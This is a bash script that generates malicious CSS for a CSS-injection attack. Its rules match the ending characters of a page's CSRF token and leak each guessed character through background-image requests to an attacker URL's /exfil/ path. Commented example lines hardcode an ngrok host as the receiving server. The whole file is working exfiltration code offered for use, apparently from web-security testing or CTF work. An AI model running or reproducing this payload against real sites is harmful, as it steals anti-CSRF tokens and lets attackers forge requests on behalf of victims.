#!/bin/bash

if [[ $# -ne 2 ]]; then
    echo "usage: ./create_malicious_css.sh [ATTACKER_URL] [SUFFIX]"
    exit 92
fi

ATTACKER_URL=$1

SUFFIX=$2

CHARACTERS="azertyuiopqsdfghjklmwxcvbnAZERTYUIOPQSDFGHJKLMWXCVBN0123456789_-éàèùç€£?,;:!?./§$éè&=+<>~#*"

for (( i=0; i<${#CHARACTERS}; i++ )); do
    C="${CHARACTERS:$i:1}" #get character
    TEXT=$C$SUFFIX
    MSG="input[name=csrf][value$=\"$TEXT\"]{
        background-image: url($ATTACKER_URL/exfil/$TEXT);
    }"
    echo $MSG
done

#()[]{}'"/\
#input[name=csrf][value$="("]{ background-image: url(https://d341-79-82-140-197.ngrok.io/exfil/(); }
# input[name=csrf][value$=")"]{ background-image: url(https://d341-79-82-140-197.ngrok.io/exfil/)); }
# input[name=csrf][value$="["]{ background-image: url(https://d341-79-82-140-197.ngrok.io/exfil/[); }
# input[name=csrf][value$="]"]{ background-image: url(https://d341-79-82-140-197.ngrok.io/exfil/]); }
# input[name=csrf][value$="{"]{ background-image: url(https://d341-79-82-140-197.ngrok.io/exfil/{); }
# input[name=csrf][value$="}"]{ background-image: url(https://d341-79-82-140-197.ngrok.io/exfil/}); }
#input[name=csrf][value$="\"]{ background-image: url(https://d341-79-82-140-197.ngrok.io/exfil/\); }
#input[name=csrf][value$="""]{ background-image: url(https://d341-79-82-140-197.ngrok.io/exfil/"); }
# input[name=csrf][value$="'"]{ background-image: url(https://d341-79-82-140-197.ngrok.io/exfil/'); }